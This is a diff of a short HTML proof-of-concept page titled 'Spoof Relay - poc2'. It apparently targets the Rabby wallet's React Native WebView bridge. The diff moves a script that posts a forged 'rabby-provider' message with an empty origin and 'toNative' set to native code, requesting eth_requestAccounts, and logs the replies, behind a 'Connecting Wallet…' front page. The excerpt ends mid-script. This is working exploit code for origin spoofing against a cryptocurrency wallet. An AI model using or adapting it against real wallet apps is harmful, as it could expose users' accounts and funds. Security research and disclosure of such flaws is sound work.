@@ -3,18 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <title>Spoof Relay - poc2: 200</title>
-  <script>
-    window.addEventListener("message", function(event) {console.log(event)});
-    ReactNativeWebView.postMessage(
-        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
-    );
-  </script>
 </head>
 <body>
   <h2>Connecting Wallet…</h2>
   <p id="msg">Please click the button to connect.</p>
   <button id="connectBtn">Connect Wallet: 400</button>
   <script>
+    window.addEventListener("message", function(event) {console.log(JSON.stringify(event.data))});
+    ReactNativeWebView.postMessage(
+        '{"name":"rabby-provider","data":{"method":"eth_requestAccounts","jsonrpc":"2.0","id":307038727,"toNative":true},"origin":""}'
+    );
+
+    
     document.getElementById('connectBtn').addEventListener('click', async () => {
       if (!window.ethereum) {
         document.getElementById('msg').innerText = 'No wallet installed!';
